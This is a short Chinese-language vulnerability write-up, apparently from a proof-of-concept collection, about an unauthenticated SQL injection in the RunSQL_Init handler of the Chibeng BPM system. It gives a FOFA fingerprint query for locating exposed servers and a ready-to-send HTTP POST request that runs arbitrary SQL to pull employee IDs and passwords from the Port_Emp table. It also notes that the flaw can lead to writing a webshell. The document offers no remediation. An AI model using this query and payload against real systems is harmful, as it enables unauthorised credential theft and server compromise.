# 驰骋BPM系统存在SQL注入漏洞

驰骋BPM RunSQL_Init 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa

```yaml
icon_hash="-1564380241" || body="正在登录流程&表单引擎设计器,请稍候"
```

## poc

```java
POST /WF/Comm/Handler.ashx?DoType=RunSQL_Init HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----123128312312389898yd98ays98d
 
------123128312312389898yd98ays98d
Content-Disposition: form-data; name="SQL"
 
SELECT No,Pass FROM Port_Emp
------123128312312389898yd98ays98d--
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408091048434.png)